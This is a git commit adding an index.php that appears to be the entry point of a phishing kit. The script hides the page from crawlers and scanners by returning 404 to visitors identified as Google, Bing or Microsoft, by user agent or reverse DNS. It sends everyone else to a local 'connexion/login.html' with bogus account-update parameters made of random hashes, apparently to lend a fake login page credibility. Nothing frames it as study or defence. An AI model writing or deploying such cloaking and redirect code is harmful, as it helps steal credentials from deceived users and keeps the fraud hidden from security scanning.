3718ce844f56f34117838d995866e9f30f32e4c9
pierrot1225ko <73966850+pierrot1225ko@users.noreply.github.com>
2020-11-04 22:02:08 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,12 @@
+<?php
+session_start();
+error_reporting(0);
+if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos($_SERVER['HTTP_USER_AGENT'],'bing') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos($_SERVER['HTTP_USER_AGENT'],'microsoft') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'bing') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'microsoft') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+$A = "./connexion/login.html?cmd=_update-information&account_update=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "";
+HEADER("location:$A");
+?>
